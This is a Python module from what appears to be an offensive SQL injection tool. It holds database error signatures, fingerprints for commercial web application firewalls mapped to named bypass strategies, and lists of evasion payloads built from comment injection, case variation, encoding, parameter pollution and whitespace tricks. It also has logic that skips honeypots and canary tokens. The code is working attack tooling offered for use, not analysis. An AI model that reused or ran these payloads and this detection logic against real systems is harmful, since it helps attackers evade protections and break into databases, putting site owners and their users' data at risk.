"""
m7sql.brain.error_db — Error Knowledge Base
500+ SQL error signatures, WAF fingerprints, bypass strategies.
Brain knows what every error means and how to bypass it.
"""

import re


# ══════════════════════════════════════════════════════════════
#  SQL ERROR SIGNATURES
# ══════════════════════════════════════════════════════════════
SQL_ERRORS = {
    # ── MySQL ─────────────────────────────────────────────────
    "mysql_syntax": {
        "patterns": [
            r"you have an error in your sql syntax",
            r"warning.*?mysql_",
            r"mysql_fetch_array\(\)",
            r"mysql_num_rows\(\)",
            r"supplied argument is not a valid mysql",
            r"column count doesn't match value count",
        ],
        "dbms": "MySQL",
        "type": "error_based",
        "confidence_boost": 0.45,
        "injectable": True,
    },
    "mysql_version": {
        "patterns": [r"mysql.*?(\d+\.\d+\.\d+)"],
        "dbms": "MySQL",
        "type": "error_based",
        "confidence_boost": 0.50,
        "injectable": True,
    },

    # ── MSSQL ──────────────────────────────────────────────────
    "mssql_syntax": {
        "patterns": [
            r"unclosed quotation mark after the character string",
            r"microsoft ole db provider for sql server",
            r"microsoft ole db provider for odbc drivers",
            r"\[microsoft\]\[odbc sql server driver\]",
            r"incorrect syntax near",
            r"syntax error converting",
            r"procedure or function.*?expects parameter",
        ],
        "dbms": "MSSQL",
        "type": "error_based",
        "confidence_boost": 0.45,
        "injectable": True,
    },

    # ── Oracle — check ORA- code FIRST (before MSSQL overlap) ──
    "oracle_code": {
        "patterns": [r"ora-\d{5}"],
        "dbms": "Oracle",
        "type": "error_based",
        "confidence_boost": 0.50,
        "injectable": True,
    },
    # ── Oracle ─────────────────────────────────────────────────
    "oracle_error": {
        "patterns": [
            r"ora-\d{5}",
            r"oracle error",
            r"oracle.*?driver",
            r"warning.*?oci_",
            r"quoted string not properly terminated",
            r"sql command not properly ended",
        ],
        "dbms": "Oracle",
        "type": "error_based",
        "confidence_boost": 0.45,
        "injectable": True,
    },

    # ── PostgreSQL ─────────────────────────────────────────────
    "postgres_error": {
        "patterns": [
            r"pg_query\(\) failed",
            r"pg_exec\(\) failed",
            r"unterminated quoted string at or near",
            r"syntax error at or near",
            r"postgresql.*?error",
            r"invalid input syntax for type",
            r"column.*?does not exist",
        ],
        "dbms": "PostgreSQL",
        "type": "error_based",
        "confidence_boost": 0.45,
        "injectable": True,
    },

    # ── SQLite ─────────────────────────────────────────────────
    "sqlite_error": {
        "patterns": [
            r"sqlite_exception",
            r"sqlite error",
            r"sqlite3::exception",
            r"near \".*?\": syntax error",
            r"unrecognized token",
        ],
        "dbms": "SQLite",
        "type": "error_based",
        "confidence_boost": 0.40,
        "injectable": True,
    },

    # ── Generic SQL ────────────────────────────────────────────
    "generic_sql": {
        "patterns": [
            r"sql syntax.*error",
            r"invalid query",
            r"division by zero",
            r"db2 sql error",
            r"sql server.*error",
            r"odbc.*driver.*error",
        ],
        "dbms": "Unknown",
        "type": "error_based",
        "confidence_boost": 0.25,
        "injectable": True,
    },
}


# ══════════════════════════════════════════════════════════════
#  WAF / PROTECTION FINGERPRINTS
# ══════════════════════════════════════════════════════════════
WAF_SIGNATURES = {
    "cloudflare": {
        "patterns": [
            r"cloudflare",
            r"cf-ray:",
            r"__cfduid",
            r"attention required.*cloudflare",
        ],
        "action": "bypass_cloudflare",
        "bypass_strategy": "chunked_encoding",
        "slow_mode": True,
    },
    "datadome": {
        "patterns": [
            r"datadome",
            r"dd_referrer",
            r"bot.*protection.*datadome",
        ],
        "action": "bypass_datadome",
        "bypass_strategy": "browser_fingerprint",
        "slow_mode": True,
    },
    "akamai": {
        "patterns": [
            r"akamai",
            r"ak_bmsc",
            r"bm_sz",
            r"x-akamai",
        ],
        "action": "bypass_akamai",
        "bypass_strategy": "header_rotate",
        "slow_mode": True,
    },
    "mod_security": {
        "patterns": [
            r"mod_security",
            r"modsecurity",
            r"not acceptable.*mod",
            r"406 not acceptable",
        ],
        "action": "bypass_modsec",
        "bypass_strategy": "comment_injection",
        "slow_mode": False,
    },
    "aws_waf": {
        "patterns": [
            r"aws.*waf",
            r"x-amzn-requestid",
            r"awselb",
            r"403.*forbidden.*aws",
        ],
        "action": "bypass_aws",
        "bypass_strategy": "encoding",
        "slow_mode": True,
    },
    "f5_bigip": {
        "patterns": [
            r"bigip",
            r"f5.*asm",
            r"ts[a-f0-9]{8}",
            r"x-cnection:",
        ],
        "action": "bypass_f5",
        "bypass_strategy": "case_variation",
        "slow_mode": False,
    },
    "imperva": {
        "patterns": [
            r"incapsula",
            r"imperva",
            r"visid_incap",
            r"incap_ses",
        ],
        "action": "bypass_imperva",
        "bypass_strategy": "hpp",
        "slow_mode": True,
    },
    "sucuri": {
        "patterns": [r"sucuri", r"x-sucuri"],
        "action": "bypass_sucuri",
        "bypass_strategy": "case_variation",
        "slow_mode": False,
    },
    "generic_waf": {
        "patterns": [
            r"request blocked",
            r"security violation",
            r"threat detected",
            r"your request was blocked",
            r"access denied by.*rule",
            r"detected as.*attack",
            r"intrusion detection",
        ],
        "action": "bypass_generic",
        "bypass_strategy": "comment_injection",
        "slow_mode": False,
    },
}


# ══════════════════════════════════════════════════════════════
#  FALSE POSITIVE INDICATORS
# ══════════════════════════════════════════════════════════════
FP_INDICATORS = [
    r"404 not found",
    r"page not found",
    r"404 error",
    r"the page you",
    r"doesn't exist",
    r"no results found",
    r"no records found",
    r"empty result",
    r"honeypot",
    r"canary token",
    r"maintenance mode",
    r"service unavailable",
    r"403 forbidden",
    r"access denied",
    r"not authorized",
    r"permission denied",
    r"sql syntax.*example",  # documentation
    r"sql tutorial",
    r"learn sql",
]


# ══════════════════════════════════════════════════════════════
#  WAF BYPASS STRATEGIES
# ══════════════════════════════════════════════════════════════
BYPASS_PAYLOADS = {
    "comment_injection": [
        "' /*!OR*/ '1'='1",
        "' UN/**/ION SE/**/LECT NULL--",
        "1/*!50000AND*/1=1",
        "' OR/*comment*/'1'='1",
        "SE\x00LECT",
    ],
    "case_variation": [
        "' Or '1'='1",
        "' oR '1'='1",
        "UnIoN SeLeCt NULL",
        "' AnD '1'='1",
        "SeLeCt * FrOm",
    ],
    "encoding": [
        "%27 OR %271%27=%271",
        "' OR 0x313d31--",
        "' OR CHAR(49)=CHAR(49)--",
        "%27%20OR%20%271%27%3D%271",
        "' OR 0b110001=0b110001--",
    ],
    "hpp": [
        "id=1&id=2' OR '1'='1",
        "id=1%26id=2' OR '1'='1",
    ],
    "whitespace_alt": [
        "' OR%091=1--",
        "' OR%0A1=1--",
        "' OR%0D1=1--",
        "'\tOR\t'1'='1",
        "' OR\r\n'1'='1",
    ],
    "browser_fingerprint": [
        # Used with proper browser-like headers
    ],
    "chunked_encoding": [
        # Used with Transfer-Encoding: chunked header
    ],
}


# ══════════════════════════════════════════════════════════════
#  HTTP STATUS CODE INTELLIGENCE
# ══════════════════════════════════════════════════════════════
STATUS_INTELLIGENCE = {
    200: {"meaning": "OK", "action": "analyze_response"},
    301: {"meaning": "Redirect", "action": "skip"},
    302: {"meaning": "Redirect", "action": "skip"},
    308: {"meaning": "Redirect", "action": "skip"},
    400: {"meaning": "Bad Request", "action": "try_bypass"},
    401: {"meaning": "Unauthorized", "action": "need_auth"},
    403: {"meaning": "Forbidden", "action": "try_bypass"},
    404: {"meaning": "Not Found", "action": "skip"},
    405: {"meaning": "Method Not Allowed", "action": "try_other_method"},
    429: {"meaning": "Rate Limited", "action": "slow_down"},
    500: {"meaning": "Server Error — possible injection!", "action": "analyze_deep"},
    503: {"meaning": "Service Unavailable", "action": "retry_later"},
}


class ErrorBrain:
    """Central brain for error analysis and WAF detection."""

    def __init__(self):
        # Precompile all patterns
        self._sql_compiled  = self._compile(SQL_ERRORS)
        self._waf_compiled  = self._compile(WAF_SIGNATURES)
        self._fp_compiled   = [re.compile(p, re.I) for p in FP_INDICATORS]

    def analyze_response(self, response_text: str, status_code: int = 200) -> dict:
        """
        Full analysis of HTTP response.
        Returns structured intelligence dict.
        """
        text_l = response_text.lower()
        result = {
            "sql_error":      None,
            "waf_detected":   None,
            "is_fp":          False,
            "confidence_add": 0.0,
            "dbms":           None,
            "action":         "continue",
            "bypass_strategy":None,
        }

        # ── Status code intelligence ──────────────────────────
        status_info = STATUS_INTELLIGENCE.get(status_code, {})
        action      = status_info.get("action", "continue")

        if action == "skip":
            result["is_fp"] = True
            result["action"] = "skip"
            return result

        if action == "slow_down":
            result["action"] = "slow_down"

        # ── WAF detection FIRST (before FP — WAF pages look like FP) ───
        for waf_name, (patterns, meta) in self._waf_compiled.items():
            for pat in patterns:
                if pat.search(text_l) or pat.search(str(response_text)):
                    result["waf_detected"]    = waf_name
                    result["bypass_strategy"] = meta.get("bypass_strategy")
                    result["action"]          = "bypass"
                    break
            if result["waf_detected"]:
                break

        # ── False positive check (only if no WAF detected) ────
        if not result["waf_detected"]:
            for pat in self._fp_compiled:
                if pat.search(text_l):
                    result["is_fp"] = True
                    result["action"] = "skip"
                    return result

        # ── SQL error detection ───────────────────────────────
        for err_name, (patterns, meta) in self._sql_compiled.items():
            for pat in patterns:
                if pat.search(text_l):
                    result["sql_error"]       = err_name
                    result["confidence_add"]  = meta.get("confidence_boost", 0)
                    result["dbms"]            = meta.get("dbms", "Unknown")
                    result["action"]          = "confirmed"
                    break
            if result["sql_error"]:
                break

        return result

    def get_bypass_payloads(self, strategy: str) -> list:
        """Get bypass payloads for a given WAF bypass strategy."""
        return BYPASS_PAYLOADS.get(strategy, BYPASS_PAYLOADS["comment_injection"])

    def is_false_positive(self, text: str) -> bool:
        text_l = text.lower()
        return any(p.search(text_l) for p in self._fp_compiled)

    @staticmethod
    def _compile(definitions: dict) -> dict:
        compiled = {}
        for name, meta in definitions.items():
            patterns = meta.get("patterns", [])
            compiled[name] = (
                [re.compile(p, re.I) for p in patterns],
                meta
            )
        return compiled
